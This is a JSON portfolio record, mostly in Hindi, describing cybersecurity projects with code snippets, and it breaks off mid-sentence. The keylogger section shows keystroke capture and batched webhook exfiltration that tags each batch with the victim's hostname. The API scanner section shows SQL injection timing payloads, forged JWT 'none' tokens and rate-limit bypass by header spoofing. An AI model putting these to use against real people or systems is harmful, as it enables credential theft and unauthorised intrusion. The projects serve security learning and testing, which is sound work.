{
  "slug": "cybersecurity-projects",
  "language": "hi",
  "title": "60 Cybersecurity Projects",
  "subtitle": "सीखने, क्लोनिंग, और पोर्टफोलियो बिल्डिंग के लिए हैंड्स-ऑन सिक्योरिटी प्रोजेक्ट्स",
  "description": "बिगिनर CLI टूल्स से लेकर एडवांस्ड फुल-स्टैक एप्लीकेशंस तक 60 cybersecurity projects का एक बढ़ता हुआ कलेक्शन। 5 प्रोजेक्ट्स पूरी तरह से complete source code के साथ बने हुए हैं; बाकी 55 में detailed implementation guides हैं जिन्हें मैं actively build कर रहा हूं, contributors के लिए भी open है। इन्हें templates के रूप में clone करें, patterns स्टडी करें, या अपने पोर्टफोलियो के लिए customize करें।",
  "tech_stack": [
    "Python",
    "TypeScript",
    "Haskell",
    "Lua",
    "React",
    "SolidJS",
    "FastAPI",
    "Flask",
    "SQLAlchemy",
    "SQLModel",
    "PostgreSQL",
    "SurrealDB",
    "Redis",
    "Docker",
    "Nginx",
    "SCSS",
    "TailwindCSS",
    "Vite"
  ],
  "github_url": "https://github.com/CarterPerez-dev/Cybersecurity-Projects",
  "demo_url": null,
  "website_url": null,
  "docs_url": null,
  "blog_url": null,
  "pypi_url": null,
  "npm_url": null,
  "ios_url": null,
  "android_url": null,
  "code_snippet": null,
  "code_language": null,
  "code_filename": null,
  "thumbnail_url": "project-cyber-projects/thumbnail.webp",
  "banner_url": "project-cyber-projects/banner.webp",
  "screenshots": null,
  "stars_count": 105,
  "forks_count": 11,
  "downloads_count": null,
  "users_count": null,
  "display_order": 2,
  "is_complete": false,
  "is_featured": true,
  "status": "active",
  "start_date": "2025-12-07",
  "end_date": null,
  "technical_details": "## Keylogger\n\n**Category:** Intermediate | **Status:** Complete\n\nसिक्योरिटी रिसर्च और penetration testing ट्रेनिंग के लिए बनाया गया एक educational keylogger। यह प्रोजेक्ट दिखाता है कि real malware कैसे keyboard hooks, active window context, और command-and-control (C2) exfiltration के through credentials capture करता है। technically interesting बात यह है कि cross-platform window tracking और batched webhook delivery जो actual APT communication patterns simulate करती है।\n\n### यह कैसे काम करता है\n\nKeylogger OS-level keyboard events में hook करने के लिए pynput के event-driven model का use करता है। जब एक key press होती है, तो उसे एक `KeyEvent` dataclass में process किया जाता है जो timestamp, key representation, और active window context capture करता है। Events तीन subsystems से गुजरते हैं: `LogManager` automatic rotation के साथ file I/O handle करता है, `WebhookDelivery` batched C2 delivery के लिए events buffer करता है, और `WindowTracker` platform-specific window title detection provide करता है। सब कुछ thread-safe है जिसमें locks shared state protect करते हैं।\n\n```python\n@staticmethod\ndef get_active_window() -> str | None:\n    system = platform.system()\n\n    if system == \"Windows\" and win32gui:\n        return WindowTracker._get_windows_window()\n    if system == \"Darwin\" and NSWorkspace:\n        return WindowTracker._get_macos_window()\n    if system == \"Linux\":\n        return WindowTracker._get_linux_window()\n\n    return None\n\n@staticmethod\ndef _get_windows_window() -> str | None:\n    try:\n        window = win32gui.GetForegroundWindow()\n        _, pid = win32process.GetWindowThreadProcessId(window)\n        process = psutil.Process(pid)\n        window_title = win32gui.GetWindowText(window)\n        return f\"{process.name()} - {window_title}\" if window_title else process.name()\n    except Exception:\n        return None\n```\n\nWindowTracker OS differences को abstract कर देता है। Windows win32gui use करता है psutil के साथ process names के लिए, macOS NSWorkspace hit करता है, और Linux xdotool को shell out करता है। Window checks 500ms intervals पर rate-limited हैं OS APIs को hammer करने से बचने के लिए।\n\n### Technical Decisions\n\n- pyHook/keyboard के ऊपर pynput: separate Windows/Linux implementations के बिना out of the box cross-platform support\n- KeyEvent और Config के लिए Dataclasses: webhook payloads के लिए clean JSON serialization, immutable-ish config\n- Batched webhook delivery: Events batch size (default 50) reach होने तक buffer होते हैं, real C2 traffic patterns mimic करते हुए जो per-keystroke beaconing avoid करते हैं\n- Size के हिसाब से log rotation: long-running captures पर disk exhaustion prevent करता है, default 5MB पर rotate होता है\n- State के लिए Threading.Event: `is_running` और `is_logging` flags race conditions के बिना clean shutdown और F9 toggle allow करते हैं\n\n```python\ndef _deliver_batch(self) -> None:\n    if not self.event_buffer or not self.config.webhook_url:\n        return\n\n    payload = {\n        \"timestamp\": datetime.now().isoformat(),\n        \"host\": platform.node(),\n        \"events\": [event.to_dict() for event in self.event_buffer]\n    }\n\n    try:\n        response = requests.post(\n            self.config.webhook_url,\n            json = payload,\n            timeout = 5\n        )\n        if response.status_code == 200:\n            self.event_buffer.clear()\n    except Exception as e:\n        logging.error(\"Webhook delivery failed: %s\", e)\n```\n\nWebhook delivery victim identification के लिए hostname include करती है, events को single payload में batch करती है, और successful delivery पर ही buffer clear करती है। Failed deliveries retry के लिए events retain करती हैं, जो actual malware network interruptions के through persistence maintain करता है।\n\n### Stack\nPython 3.13+, pynput, requests, win32gui/psutil (Windows), pyobjc (macOS), xdotool (Linux)\n\n---\n\n## DNS Lookup Tool\n\n**Category:** Intermediate | **Status:** Complete\n\nएक professional DNS query CLI जो simple lookups से आगे जाती है। Tool multi-record queries, reverse lookups, batch processing, और Rich terminal output के साथ WHOIS retrieval perform करता है। standout capability DNS trace है, जो root servers से TLD servers होते हुए authoritative nameservers तक complete resolution path visualize करता है, exactly दिखाते हुए कि DNS delegation कैसे काम करती है।\n\n### यह कैसे काम करता है\n\nResolver multiple record types को concurrently query करने के लिए dnspython की async capabilities use करता है। Standard lookups के लिए, यह हर requested record type के लिए parallel queries fire करता है और results aggregate करता है। Tracing के लिए, यह manually iterative resolution implement करता है, root servers से शुरू करके और hierarchy को NS referrals follow करते हुए authoritative answer तक पहुंचता है।\n\nCLI layer queries के during progress spinners और formatted output tables के लिए Rich integration के साथ Typer use करती है। Results scripting के लिए JSON के रूप में export हो सकते हैं या color coded record types और human readable TTL formatting के साथ display हो सकते हैं।\n\n```python\nwhile True:\n    server_name, server_ip = current_servers[0]\n    query = dns.message.make_query(name, rdtype)\n    response = dns.query.udp(query, server_ip, timeout=3.0)\n\n    if response.answer:\n        for rrset in response.answer:\n            for rdata in rrset:\n                result.final_answer = str(rdata)\n        result.hops.append(TraceHop(\n            zone=current_zone, server=server_name,\n            server_ip=server_ip,\n            response=f\"{record_type}: {result.final_answer}\",\n            is_authoritative=True,\n        ))\n        break\n\n    if response.authority:\n        # Extract NS records and follow referrals\n        glue_ips = {str(rrset.name).rstrip(\".\"): rdata.address\n                    for rrset in response.additional\n                    if rrset.rdtype == dns.rdatatype.A\n                    for rdata in rrset}\n```\n\nयह trace command का core है। यह manually DNS hierarchy walk करता है हर level पर queries send करके और referrals follow करके, available होने पर glue records handle करते हुए या नहीं होने पर nameserver IPs resolve करते हुए।\n\n### Technical Decisions\n\n- Tracing के लिए recursive के बजाय iterative resolution choose किया actual delegation chain expose करने के लिए बजाय सिर्फ final answer लेने के\n- Batch lookups में partial failures gracefully handle करने के लिए `return_exceptions=True` के साथ `asyncio.gather` use किया पूरे operation को kill किए बिना\n- Readability के लिए TTL formatting implement की जो seconds, minutes, hours, और days के बीच auto scales करती है\n- Output formatting को resolution logic से पूरी तरह separate किया, JSON export trivial बना दिया\n\n```python\nasync def batch_lookup(\n    domains: list[str],\n    record_types: list[RecordType] | None = None,\n    nameserver: str | None = None,\n    timeout: float = 5.0,\n) -> list[DNSResult]:\n    tasks = [lookup(domain, record_types, nameserver, timeout) \n             for domain in domains]\n    return await asyncio.gather(*tasks)\n```\n\nBatch lookups sequentially के बजाय concurrently fan out होती हैं, इसलिए 100 domains query करने में roughly एक query जितना ही time लगता है।\n\n### Stack\nPython 3.13, dnspython, Typer, Rich, python-whois, pytest, mypy, ruff\n\n---\n\n## Full Stack API Security Scanner\n\n**Category:** Intermediate | **Status:** Complete\n\nएक dockerized security testing platform जो OWASP API Security Top 10 से mapped common vulnerabilities के लिए APIs scan करता है। Scanner rate limiting, authentication flaws, SQL injection, और IDOR/BOLA vulnerabilities cover करने वाले चार specialized modules orchestrate करता है। Technically interesting बात है blind vulnerability detection के लिए statistical approach और production safe request handling जो scanner को खुद service disruptions cause करने से रोकती है।\n\n### यह कैसे काम करता है\n\nBackend एक layered architecture follow करता है जिसमें FastAPI routing handle करता है, एक service layer business logic orchestrate करती है, और एक repository layer database operations abstract करती है। हर vulnerability scanner एक BaseScanner class से inherit करता है जो request spacing, exponential backoff के साथ retry logic, और evidence collection सहित common HTTP functionality provide करती है। जब एक scan initiate होता है, ScanService requested scanner classes instantiate करती है, उन्हें sequentially execute करती है, और repository layer के through results persist करती है।\n\nScanner modules vulnerability type के based पर distinct detection strategies implement करते हैं। Error based SQLi responses में database signatures look करता है। Boolean based detection true और false injected conditions के बीच response lengths compare करती है। Time based blind detection multiple samples use करके baseline response time establish करती है, फिर false positives minimize करते हुए sleep payloads से caused delays identify करने के लिए statistical analysis use करती है। Auth scanner missing authentication, JWT none algorithm acceptance, और signature validation bypasses test करता है।\n\n```python\ndef _test_time_based_sqli(self, delay_seconds: int = 5) -> dict[str, Any]:\n    try:\n        baseline_mean, baseline_stdev = self.get_baseline_timing(\"/\")\n        threshold = baseline_mean + (3 * baseline_stdev)\n        expected_delay_time = baseline_mean + delay_seconds\n\n        delay_payloads = {\n            \"mysql\": [p for p in all_time_payloads if \"SLEEP\" in p],\n            \"postgres\": [p for p in all_time_payloads if \"pg_sleep\" in p],\n            \"mssql\": [p for p in all_time_payloads if \"WAITFOR\" in p],\n        }\n\n        for db_type, payloads in delay_payloads.items():\n            for payload in payloads:\n                delay_times = []\n                for _ in range(3):\n                    response = self.make_request(\"GET\", f\"/?id={payload}\", timeout=delay_seconds + 10)\n                    delay_times.append(getattr(response, \"request_time\", 0.0))\n                    time.sleep(1)\n\n                avg_delay = statistics.mean(delay_times)\n                if avg_delay >= expected_delay_time - 1:\n                    return {\"vulnerable\": True, \"database_type\": db_type, \"confidence\": \"HIGH\" if avg_delay >= expected_delay_time else \"MEDIUM\"}\n```\n\nयह time based SQLi detection hardcoded thresholds के बजाय statistical baselining use करती है, MySQL, PostgreSQL, और MSSQL syntax variations में delay payloads test करने से पहले normal response variance establish करने के लिए multiple samples लेते हुए।\n\n### Technical Decisions\n\n- Scanners के लिए abstract base class pattern use किया ताकि rate limiting और retry handling जैसी common HTTP logic एक जगह रहे जबकि हर vulnerability type अपनी detection strategy implement करे\n- Configurable jitter के साथ request spacing implement की targets को overwhelm करने या scans के during rate limits trigger करने से बचने के लिए, max requests और time window के based पर dynamically calculated\n- JWT testing none algorithm के case variations cover करती है क्योंकि कुछ implementations सिर्फ lowercase check करती हैं, plus signature removal और malformed token acceptance\n- Rate limit bypass testing X-Forwarded-For और X-Real-IP via IP header spoofing include करती है, plus endpoint path variations जो कभी-कभी case sensitive rate limiters bypass करती हैं\n- Frontend sessions में form state preserve करने के लिए persistence middleware के साथ immutable state updates के लिए immer के साथ Zustand use करता है जो seven days बाद automatic expiration के साथ\n- Type guards data application state में enter करने से पहले runtime पर सभी API responses validate करते हैं, backend contract violations early catch करते हुए\n\n```python\ndef _test_none_algorithm(self) -> dict[str, Any]:\n    try:\n        header, payload, signature = self.auth_token.split(\".\")\n        none_variants = AuthPayloads.get_jwt_none_variants()  # [\"none\", \"None\", \"NONE\", \"nOnE\", ...]\n\n        for variant in none_variants:\n            malicious_header = self._base64url_encode(json.dumps({\"alg\": variant, \"typ\": \"JWT\"}))\n            malicious_token = f\"{malicious_header}.{payload}.\"\n\n            response = self.make_request(\"GET\", \"/\", headers={\"Authorization\": f\"Bearer {malicious_token}\"})\n            if response.status_code == 200:\n                return {\"vulnerable\": True, \"vulnerability_type\": \"JWT None Algorithm\", \"algorithm_variant\": variant}\n\n        return {\"vulnerable\": False, \"description\": \"None algorithm properly rejected\"}\n    except Exception as e:\n        return {\"vulnerable\": False, \"error\": str(e)}\n```\n\nJWT none algorithm test algorithm के रूप में \"none\" के various case permutations के साथ tokens construct करता है, signature strip करता है, और check करता है कि API उन्हें accept करता है या नहीं। एक vulnerable endpoint 200 return करेगा, indicating कि यह unsigned tokens process करता है।\n\n### Stack\nPython, FastAPI, SQLAlchemy, PostgreSQL, React, TypeScript, Zustand, TanStack Query, Docker, Nginx\n\n---\n\n## FastAPI-420 (API Rate Limiter)\n\n**Category:** Advanced | **Status:** Complete\n\nFastAPI के लिए एक production grade rate limiting library जो API abuse और DDoS attacks के against तीन layer defense system implement करती है। नाम में \"420\" Twitter के old HTTP 420 \"Enhance Your Calm\" response code को reference करता है, जिसे library standard 429 के बजाय resurface करती है। Technically interesting बात कई hard problems का convergence है: Lua scripts via atomic distributed counters, sophisticated client fingerprinting जो IPv6 /64 prefix exploitation account करती है, multiple defense modes के साथ circuit breaker pattern, और एक clean abstraction layer जो आपको application code touch किए बिना algorithms और storage backends swap करने देती है। पूरी चीज़ end to end typed है runtime checkable protocols के साथ और blocking middleware और एक \"slow down\" variant दोनों के साथ ship होती है जो hard rejections के बजाय progressive delays add करता है।\n\n### यह कैसे काम करता है\n\nArchitecture तीन defensive layers पर operate करती है जिनसे requests को sequentially pass करना होता है। Layer 1 IP addresses, user agents, authentication tokens, और optionally TLS fingerprints और header ordering से built composite fingerprints use करके per user per endpoint limiting handle करती है। Layer 2 individual endpoints को overwhelmed होने से protect करती है per route global limits apply करके, ताकि single endpoint सारी available capacity consume न कर सके। Layer 3 एक circuit breaker है जो total API traffic monitor करता है और thresholds exceed होने पर different defense modes में trip हो सकता है।\n\nLayered defense coordinator requests को तीनों layers से process करता है और first failure पर `EnhanceYourCalm` exception (HTTP 420) raise करता है। हर layer एक structured format use करके अपनी rate limit key build करती है: `{prefix}:{version}:{layer}:{endpoint}:{identifier}:{window}`। यह key structure मतलब आप debugging के during Redis directly inspect कर सकते हैं और immediately समझ सकते हैं कि आप क्या देख रहे हैं।\n\n```python\nasync def check_all_layers(\n    self,\n    request: Request,\n    fingerprint: FingerprintData,\n    endpoint: str,\n    rules: list[RateLimitRule],\n) -> RateLimitResult:\n    \"\"\"\n    Check all defense layers in order\n    \"\"\"\n    context = DefenseContext(\n        fingerprint = fingerprint,\n        endpoint = endpoint,\n        method = request.method,\n        is_authenticated = fingerprint.auth_identifier is not None,\n    )\n\n    layer3_result = await self._check_layer3_global(context)\n    if not layer3_result.allowed:\n        self._log_violation(layer3_result, context)\n        raise EnhanceYourCalm(\n            result = layer3_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = \"API is under heavy load. Please try again later.\",\n        )\n\n    layer2_result = await self._check_layer2_endpoint(context, rules)\n    if not layer2_result.allowed:\n        self._log_violation(layer2_result, context)\n        raise EnhanceYourCalm(\n            result = layer2_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = self._settings.HTTP_420_DETAIL,\n        )\n\n    layer1_result = await self._check_layer1_user(context, rules)\n    if not layer1_result.allowed:\n        self._log_violation(layer1_result, context)\n        raise EnhanceYourCalm(\n            result = layer1_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = self._settings.HTTP_420_DETAIL,\n        )\n\n    return layer1_result.result\n```\n\nLayered defense system first failure पर short circuits करता है, per user lookups पर cycles waste करने से पहले global health check करते हुए। Defense context authentication state और reputation scores carry करता है जिन्हें downstream layers bypass decisions make करने के लिए use कर सकती हैं।\n\nStorage एक protocol interface के पीछे abstracted है जिसमें दो implementations हैं: distributed deployments के लिए Redis और single instance या development use के लिए in memory। Redis backend startup पर Lua scripts preload करता है और atomicity guarantee करने के लिए EVALSHA via execute करता है बिना हर call पर script bodies retransmit किए। अगर Redis NOSCRIPT return करता है (scripts cache से evict हुई), backend automatically reload और retry करता है।\n\nLibrary चार rate limiting algorithms support करती है जो सब same `BaseAlgorithm` abstract class implement करती हैं: sliding window O(1) memory per client के साथ approximately 99.997% accuracy के लिए दो fixed windows के बीच weighted interpolation use करती है; token bucket average rates enforce करते हुए bucket capacity तक controlled bursting allow करता है; fixed window simpler है पर boundary burst problem से suffer करती है; leaky bucket sliding window को aliased है क्योंकि implementations most use cases के लिए functionally equivalent हैं।\n\n```lua\n--[[\nsliding_window.lua\nAtomic sliding window counter rate limiting.\nReturns: {allowed (0/1), remaining, reset_after}\n--]]\n\nlocal key = KEYS[1]\nlocal window_seconds = tonumber(ARGV[1])\nlocal limit = tonumber(ARGV[2])\nlocal now = tonumber(ARGV[3])\n\nlocal current_window = math.floor(now / window_seconds)\nlocal previous_window = current_window - 1\nlocal elapsed_ratio = (now % window_seconds) / window_seconds\n\nlocal current_key = key .. \":\" .. current_window\nlocal previous_key = key .. \":\" .. previous_window\n\nlocal current_count = tonumber(redis.call('GET', current_key)) or 0\nlocal previous_count = tonumber(redis.call('GET', previous_key)) or 0\n\nlocal weighted_count = math.floor(previous_count * (1 - elapsed_ratio) + current_count)\nlocal reset_after = window_seconds - (now % window_seconds)\n\nif weighted_count >= limit then\n    return {0, 0, reset_after, reset_after}\nend\n\nredis.call('INCR', current_key)\nredis.call('EXPIRE', current_key, window_seconds * 2)\n\nlocal new_weighted = math.floor(previous_count * (1 - elapsed_ratio) + current_count + 1)\nlocal remaining = math.max(0, limit - new_weighted)\n\nreturn {1, remaining, reset_after, 0}\n```\n\nSliding window Lua script Redis में atomically run होती है। weighted interpolation formula `previous_count * (1 - elapsed_ratio) + current_count` windows के बीच smoothly transition करता है, boundary burst vulnerability eliminate करते हुए जहां attackers window edges पर requests time करके 2x limit बना सकते थे। Keys 2x window duration बाद expire होती हैं calculation के लिए previous window always available ensure करने के लिए।\n\nFingerprinting system वह जगह है जहां यह particularly interesting हो जाता है। सिर्फ IP addresses पर rely करने के बजाय, `CompositeFingerprinter` configurable intensity levels के based पर multiple signals से identifiers build करता है। Strict mode सब कुछ use करता है: IP, user agent, accept headers, header ordering, auth tokens, TLS/JA3 fingerprints, और geographic ASN। Normal mode (default) IP, user agent, और auth use करता है। Relaxed mode maximum compatibility के लिए सिर्फ IP और auth use करता है।\n\n```python\nclass CompositeFingerprinter:\n    \"\"\"\n    Combines multiple fingerprinting methods based on configuration\n\n    Preset levels determine which extractors are used:\n    - strict: All methods (IP, headers, auth, TLS, geo)\n    - normal: IP + User-Agent + Auth (default)\n    - relaxed: IP + Auth only\n    - custom: Configured via settings\n    \"\"\"\n    def __init__(\n        self,\n        level: FingerprintLevel = FingerprintLevel.NORMAL,\n        ip_extractor: IPExtractor | None = None,\n        headers_extractor: HeadersExtractor | None = None,\n        auth_extractor: AuthExtractor | None = None,\n        use_ip: bool = True,\n        use_user_agent: bool = True,\n        use_accept_headers: bool = False,\n        use_header_order: bool = False,\n        use_auth: bool = True,\n        use_tls: bool = False,\n        use_geo: bool = False,\n    ) -> None:\n        self.level = level\n        self._ip_extractor = ip_extractor or IPExtractor()\n        self._headers_extractor = headers_extractor or HeadersExtractor(\n            use_header_order = use_header_order,\n        )\n        self._auth_extractor = auth_extractor or AuthExtractor()\n\n        if level == FingerprintLevel.STRICT:\n            self.use_ip = True\n            self.use_user_agent = True\n            self.use_accept_headers = True\n            self.use_header_order = True\n            self.use_auth = True\n            self.use_tls = True\n            self.use_geo = True\n        elif level == FingerprintLevel.RELAXED:\n            self.use_ip = True\n            self.use_user_agent = False\n            self.use_accept_headers = False\n            self.use_header_order = False\n            self.use_auth = True\n            self.use_tls = False\n            self.use_geo = False\n        # ... continues for other levels\n```\n\nHeader ordering fingerprinting के लिए particularly clever है क्योंकि यह browser specific है और user configurable नहीं है। Chrome, Firefox, और Safari सब different orders में headers send करते हैं, इसलिए अगर attacker Chrome user agent string spoof करता है, तो भी उनका header order अक्सर true client betray कर देता है।\n\nIPv6 clients के लिए, raw addresses उनके /64 network prefix में normalize होते हैं। यह matter करता है क्योंकि residential और mobile users typically entire /64 blocks (roughly 18 quintillion addresses) control करते हैं, naive per IP rate limiting को completely ineffective बनाते हुए। Attacker trivially अपने allocation में addresses rotate कर सकता था। Normalization एक /64 में सभी addresses को network address में collapse कर देती है, उन्हें single identity treat करते हुए।\n\n```python\ndef _normalize_ip(self, ip_str: str) -> str:\n    \"\"\"\n    Normalize IP address for rate limiting\n\n    IPv6 addresses are normalized to their /64 network prefix\n    since users typically control entire /64 blocks.\n    \"\"\"\n    try:\n        addr = ip_address(ip_str)\n    except ValueError:\n        return ip_str\n\n    if isinstance(addr, IPv6Address):\n        if addr.ipv4_mapped:\n            return str(addr.ipv4_mapped)\n\n        network = ip_network(\n            f\"{ip_str}/{self.ipv6_prefix_length}\",\n            strict = False,\n        )\n        return str(network.network_address)\n\n    return str(addr)\n```\n\nAuthentication extractor एक fallback chain implement करता है: पहले JWT subject claim, फिर API key header, फिर API key query parameter, फिर session cookie। JWT parsing secret verification के साथ या बिना काम करती है क्योंकि library को rate limiting के लिए सिर्फ identity चाहिए, authorization नहीं। जब secret configured नहीं है, यह validation के बिना subject claim extract करती है, जो safe है क्योंकि rate limit key सिर्फ एक bucket identifier है, trust decision नहीं।\n\n### Technical Decisions\n\n- Boundary burst problem eliminate करने के लिए pure fixed window के बजाय sliding window choose किया। Fixed windows के साथ, attacker जो 11:59:59 पर 100 requests और 12:00:01 पर और 100 requests करता है effectively 100/minute limit के बावजूद 2 seconds में 200 requests पाता है। Weighted interpolation windows के बीच smoothly transition करता है, accurate counts maintain करते हुए चाहे requests कभी भी आएं।\n\n- हर Redis operation पर Lua script bodies retransmit करने से बचने के लिए EVAL के बजाय cached script hashes के साथ EVALSHA use किया। Scripts startup पर `script_load` via एक बार load होती हैं और SHA1 hashes cached रहते हैं। अगर Redis NOSCRIPT return करता है (indicating scripts script cache से evict हुईं), backend exception catch करता है, सभी scripts reload करता है, और transparently retry करता है।\n\n- IPv6 /64 prefix normalization implement की क्योंकि standard /128 per address approach trivially bypassable है। Most IPv6 allocations users को minimum एक /64 देती हैं, और कई ISPs /56 या /48 prefixes भी hand out करते हैं। Configurable `ipv6_prefix_length` parameter operators को अपने threat model के लिए tune करने देता है।\n\n- Circuit breaker सिर्फ open/closed के बजाय multiple defense modes के साथ built किया। Adaptive mode authenticated users को through allow करता है जब circuit trip होता है, attacks के during legitimate users के लिए service maintain करते हुए। Lockdown mode high reputation scores वाले clients को traffic restrict करता है। Half open state circuit fully close करने से पहले gradual recovery testing allow करती है।\n\n- Fingerprinting system header ordering को anti spoofing signal के रूप में use करता है। Browsers headers deterministic पर browser specific orders में send करते हैं जिन्हें users change नहीं कर सकते। अगर attacker Chrome user agent string set भी करता है, उनका header order reveal कर सकता है कि वे actually curl या Python script use कर रहे हैं।\n\n- Memory storage memory usage bound करने के लिए LRU eviction के साथ `OrderedDict` use करता है। जब max keys exceed होती हैं, oldest entries (access time के हिसाब से) पहले evict होती हैं। एक background asyncio task periodically expired entries clean up करती है abandoned rate limit buckets से memory leaks prevent करने के लिए।\n\n- Dependency injection system multiple integration patterns provide करता है: route level limits के लिए `@limiter.limit()` decorator, FastAPI के `Depends()` के साथ काम करने वाली `RateLimitDep` class, route groups पर different rules apply करने के लिए `ScopedRateLimiter`, और blanket coverage के लिए full middleware। यह flexibility मतलब library काम करती है चाहे आपकी FastAPI app कैसे भी structured हो।\n\n- Alternative `SlowDownMiddleware` built की जो hard blocks के बजाय progressive delays add करती है। यह gradual degradation के लिए useful है जहां आप abuse discourage करना चाहते हैं बिना borderline users को completely cut off किए। Delay increments maximum तक configurable हैं।\n\n```python\nclass RateLimitDep:\n    \"\"\"\n    FastAPI dependency for rate limiting\n\n    Usage:\n        @app.get(\"/api/data\", dependencies=[Depends(RateLimitDep(\"100/minute\"))])\n        async def get_data():\n            return {\"data\": \"value\"}\n\n        # Or with result access:\n        @app.get(\"/api/data\")\n        async def get_data(limit_result: Annotated[RateLimitResult, Depends(RateLimitDep(\"100/minute\"))]):\n            return {\"remaining\": limit_result.remaining}\n    \"\"\"\n    def __init__(\n        self,\n        *rules: str,\n        limiter: RateLimiter | None = None,\n        key_func: Callable[[Request], str] | None = None,\n    ) -> None:\n        self.rules = [RateLimitRule.parse(rule) for rule in rules]\n        self._limiter = limiter\n        self.key_func = key_func\n\n    async def __call__(self, request: Request) -> RateLimitResult:\n        \"\"\"\n        Check rate limit and return result\n        \"\"\"\n        rule_strings = [str(rule) for rule in self.rules]\n        return await self.limiter.check(\n            request,\n            *rule_strings,\n            key_func = self.key_func,\n            raise_on_limit = True,\n        )\n```\n\nDependency class rule strings हर request के बजाय instantiation time पर parse करती है, और `RateLimitResult` expose करती है ताकि routes remaining quota, reset times, और अपनी logic के लिए other metadata access कर सकें।\n\n- Configuration validation के लिए environment specific enforcement के साथ Pydantic का `model_validator` use किया। Production deployments के लिए या तो Redis URL या explicit acknowledgment कि memory fallback acceptable है required है। Rate limit strings config load time पर validate होती हैं ताकि malformed rules runtime के बजाय fast fail हों।\n\n- Exception hierarchy rate limit exceeded (user की fault), storage errors (infrastructure problem), configuration errors (developer की fault), और circuit breaker open (system protection) के बीच distinguish करती है। हर exception type सिर्फ message strings के बजाय logging और debugging के लिए structured details carry करता है।\n\n### Stack\nPython 3.12+, FastAPI, Starlette, Redis, Pydantic, Pydantic Settings, PyJWT, Lua, asyncio, mypy (strict mode), ruff, pylint\n\n---\n\n## Encrypted P2P Chat\n\n**Category:** Advanced | **Status:** Active\n\nEnd-to-end encrypted messaging के लिए Signal Protocol का full implementation, scratch से बिना किसी cryptographic shortcuts के built। System asynchronous key exchange के लिए X3DH (Extended Triple Diffie-Hellman) और forward secrecy के लिए Double Ratchet algorithm implement करता है, मतलब हर single message cryptographic operations की chain के through derived एक unique encryption key use करता है। Authentication पूरी तरह passwordless है WebAuthn/FIDO2 passkeys via, credential databases को entirely eliminate करते हुए।\n\nArchitecture तीन databases use करती है, हर एक अपने specific role के लिए optimized: PostgreSQL user identity और credential storage को ACID guarantees के साथ handle करता है, SurrealDB instant message delivery के लिए native live queries के साथ real-time document storage provide करता है, और Redis automatic TTL expiration के साथ ephemeral WebAuthn challenges manage करता है। Frontend React के बजाय SolidJS में built है, real-time messaging context में smaller bundle और better performance के लिए fine-grained reactivity use करते हुए।\n\n### यह कैसे काम करता है\n\nEncryption pipeline तब शुरू होती है जब user conversation initiate करता है। Sender recipient का prekey bundle server से retrieve करता है, जिसमें उनकी long-term identity key, medium-term signed prekey (हर 48 hours rotate होती है), और optionally एक single-use one-time prekey होती है। X3DH protocol इन keys और freshly generated ephemeral keypair के various combinations के बीच चार Diffie-Hellman operations perform करता है, फिर HKDF के through shared secret derive करता है। यह shared secret Double Ratchet initialize करती है।\n\nएक बार ratchet initialize हो जाती है, हर message एक symmetric key ratchet step trigger करती है जो unique message key derive करती है और chain advance करती है। जब recipient respond करता है, एक DH ratchet step occur होती है: दोनों parties new ephemeral keypairs generate करती हैं, fresh DH exchanges perform करती हैं, और entirely new root और chain keys derive करती हैं। मतलब single message key compromise करना past या future messages के बारे में कुछ reveal नहीं करता। Implementation out-of-order delivery भी handle करती है skipped message keys cache करके, memory exhaustion attacks prevent करने के लिए configurable limits से bounded।\n\n```python\ndef encrypt_message(\n    self,\n    state: DoubleRatchetState,\n    plaintext: bytes,\n    associated_data: bytes\n) -> EncryptedMessage:\n    \"\"\"\n    Encrypts message and advances sending ratchet\n    \"\"\"\n    state.sending_chain_key, message_key = self._kdf_ck(\n        state.sending_chain_key\n    )\n\n    nonce, ciphertext = self._encrypt_with_message_key(\n        message_key,\n        plaintext,\n        associated_data\n    )\n\n    if state.dh_private_key:\n        dh_public = state.dh_private_key.public_key()\n        dh_public_bytes = dh_public.public_bytes(\n            encoding = serialization.Encoding.Raw,\n            format = serialization.PublicFormat.Raw\n        )\n    else:\n        dh_public_bytes = b'\\x00' * X25519_KEY_SIZE\n\n    encrypted_msg = EncryptedMessage(\n        ciphertext = ciphertext,\n        nonce = nonce,\n        dh_public_key = dh_public_bytes,\n        message_number = state.sending_message_number,\n        previous_chain_length = state.previous_sending_chain_length\n    )\n\n    state.sending_message_number += 1\n    return encrypted_msg\n```\n\nयह core encryption path है। हर call chain key से HMAC use करके fresh message key derive करती है, AES-256-GCM से encrypt करती है, और sender की current DH public key message header में package करती है ताकि recipient DH ratchet step perform कर सके।\n\nWebSocket layer automatic heartbeats और reconnection logic के साथ persistent connections maintain करती है। जब message arrive होता है, SurrealDB का live query system उसे directly recipient के connection manager को push करता है, जो उसे उनके सभी active devices को route करती है। Connection manager per-user connection limits enforce करती है और graceful degradation handle करती है जब connections die होती हैं।\n\n```python\nasync def connect(self, websocket: WebSocket, user_id: UUID) -> bool:\n    \"\"\"\n    Accept WebSocket connection and register user\n    \"\"\"\n    await websocket.accept()\n\n    if user_id not in self.active_connections:\n        self.active_connections[user_id] = []\n\n    if len(self.active_connections[user_id]) >= WS_MAX_CONNECTIONS_PER_USER:\n        await self._send_error(\n            websocket,\n            \"max_connections\",\n            f\"Maximum {WS_MAX_CONNECTIONS_PER_USER} connections per user\"\n        )\n        await websocket.close()\n        return False\n\n    self.active_connections[user_id].append(websocket)\n\n    try:\n        await presence_service.set_user_online(user_id)\n    except Exception as e:\n        await self._send_error(websocket, \"database_error\", \"Failed to initialize connection\")\n        self.active_connections[user_id].remove(websocket)\n        if not self.active_connections[user_id]:\n            del self.active_connections[user_id]\n        await websocket.close()\n        return False\n\n    self.heartbeat_tasks[user_id] = asyncio.create_task(\n        self._heartbeat_loop(websocket, user_id)\n    )\n\n    await self._subscribe_to_messages(user_id)\n    return True\n```\n\nConnection management multi-device scenarios handle करती है, limits enforce करती है, presence tracking initialize करती है, heartbeat loop start करती है, और incoming messages के लिए SurrealDB live queries subscribe करती है, सब atomically किसी भी failure पर proper cleanup के साथ।\n\n### Technical Decisions\n\n**Identity के लिए X25519 + Ed25519 dual keypairs**: Protocol को key agreement (DH operations के लिए) और signing (prekey authentication के लिए) दोनों require करता है। Transformations के साथ single curve use करने के बजाय, separate X25519 और Ed25519 keypairs maintain करना cleaner है और subtle cryptographic footguns avoid करता है।\n\n**Real-time data के लिए SurrealDB**: LISTEN/NOTIFY के साथ 